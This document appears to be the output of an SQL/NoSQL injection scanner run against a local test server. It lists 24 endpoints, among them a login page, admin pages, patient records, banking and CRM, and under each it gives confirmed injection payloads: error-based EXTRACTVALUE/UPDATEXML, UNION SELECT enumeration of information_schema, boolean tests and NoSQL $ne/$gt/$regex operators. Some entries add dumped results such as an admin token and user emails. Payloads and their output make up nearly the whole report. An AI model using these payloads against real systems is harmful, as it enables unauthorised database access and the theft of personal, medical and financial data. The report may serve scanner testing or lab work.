-- sqli-hunter extraction report
-- Domain: 127.0.0.1
-- Generated: 2026-06-30T22:12:47Z
-- URLs: 24 scanned, 24 vulnerable

/* ============================================================ */
/* URL: http://127.0.0.1:46033/shop/product.php */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/shop/search */
/* VULN: sqli_union | param: q | confidence: confirmed */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: q | confidence: confirmed */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* ============================================================ */
-- version: 8.0.32-MySQL

/* ============================================================ */
/* URL: http://127.0.0.1:46033/shop/category */
/* VULN: sqli_boolean | param: cat | confidence: medium */
/* Payload: ' OR '1'='1 | ' AND '1'='2 */
/* VULN: sqli_boolean | param: cat | confidence: medium */
/* Payload: ' OR 1=1-- | ' AND 1=2-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/auth/login */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: username | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: username | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/api/v1/auth */
/* VULN: nosql | param: email | confidence: high */
/* Payload: {"$gt":""} */
/* VULN: nosql | param: email | confidence: high */
/* Payload: {"$ne":null} */
/* VULN: nosql | param: email | confidence: high */
/* Payload: ' || '1'=='1 */
/* VULN: nosql | param: email | confidence: high */
/* Payload: [$ne]=1 */
/* VULN: nosql | param: email | confidence: high */
/* Payload: {"$regex":".*"} */
/* ============================================================ */
-- dump: {"token":"eyJhbG","user":{"email":"admin@corp.com","role":"admin"}}
-- user: {"token":"eyJhbG","user":{"email":"admin@corp.com","role":"admin"}}

/* ============================================================ */
/* URL: http://127.0.0.1:46033/api/v1/password-reset */
/* VULN: nosql | param: email | confidence: high */
/* Payload: {"$gt":""} */
/* VULN: nosql | param: email | confidence: high */
/* Payload: {"$ne":null} */
/* VULN: nosql | param: email | confidence: high */
/* Payload: [$ne]=1 */
/* ============================================================ */
-- dump: {"message":"reset sent","users":[{"email":"admin@corp.com"},{"email":"user@test.com"}]}

/* ============================================================ */
/* URL: http://127.0.0.1:46033/api/v2/users */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: user_id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: user_id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/api/v2/orders/lookup */
/* VULN: nosql | param: orderId | confidence: high */
/* Payload: {"$gt":""} */
/* VULN: nosql | param: orderId | confidence: high */
/* Payload: {"$ne":null} */
/* VULN: nosql | param: customerId | confidence: high */
/* Payload: {"$gt":""} */
/* VULN: nosql | param: orderId | confidence: high */
/* Payload: [$ne]=1 */
/* VULN: nosql | param: customerId | confidence: high */
/* Payload: {"$ne":null} */
/* VULN: nosql | param: customerId | confidence: high */
/* Payload: [$ne]=1 */
/* ============================================================ */
-- dump: {"orders":[{"id":"ORD-99999","amount":50000,"customer":"admin"}]}

/* ============================================================ */
/* URL: http://127.0.0.1:46033/api/v1/invoices */
/* VULN: sqli_union | param: page | confidence: confirmed */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* ============================================================ */
-- version: Microsoft SQL Server 2019

/* ============================================================ */
/* URL: http://127.0.0.1:46033/admin/users/search */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: q | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: q | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/admin/reports */
/* VULN: sqli_error | param: report_id | confidence: high */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: report_id | confidence: high */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* ============================================================ */
-- version: 8.0.32-MySQL

/* ============================================================ */
/* URL: http://127.0.0.1:46033/admin/logs */
/* VULN: sqli_boolean | param: level | confidence: medium */
/* Payload: ' OR '1'='1 | ' AND '1'='2 */
/* VULN: sqli_boolean | param: level | confidence: medium */
/* Payload: ' OR 1=1-- | ' AND 1=2-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/portal/patient */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: patient_id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: patient_id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/portal/lab-results */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: record_id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: record_id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/banking/statement */
/* VULN: sqli_union | param: account | confidence: confirmed */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: account | confidence: confirmed */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* ============================================================ */
-- version: PostgreSQL 14.10

/* ============================================================ */
/* URL: http://127.0.0.1:46033/banking/transfer/status */
/* VULN: sqli_boolean | param: ref | confidence: medium */
/* Payload: ' OR '1'='1 | ' AND '1'='2 */
/* VULN: sqli_boolean | param: ref | confidence: medium */
/* Payload: ' OR 1=1-- | ' AND 1=2-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/blog/article */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: slug | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: slug | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/blog/comments?post_id=1 */
/* VULN: sqli_union | param: post_id | confidence: confirmed */
/* Payload: ' UNION SELECT database(),NULL-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/artists.php */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: artist | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: artist | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/review.php */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: product_id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: product_id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/crm/contacts */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: contact_id | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: contact_id | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/saas/tenants/search?name=acme */
/* VULN: nosql | param: name | confidence: high */
/* Payload: {"$regex":".*"} */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/booking/hotel */
/* VULN: sqli_boolean | param: booking_ref | confidence: medium */
/* Payload: ' OR '1'='1 | ' AND '1'='2 */
/* VULN: sqli_boolean | param: booking_ref | confidence: medium */
/* Payload: ' OR 1=1-- | ' AND 1=2-- */
/* ============================================================ */

/* ============================================================ */
/* URL: http://127.0.0.1:46033/flights/search */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: ' */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: ' OR '1'='1'-- */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: 1' OR '1'='1-- */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: ') OR ('1'='1 */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: admin'-- */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- */
/* VULN: sqli_error | param: from | confidence: confirmed */
/* Payload: 1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT NULL-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT version(),NULL-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT database(),NULL-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT user(),NULL-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT 1,@@version,3-- */
/* VULN: sqli_union | param: from | confidence: high */
/* Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables-- */
/* ============================================================ */

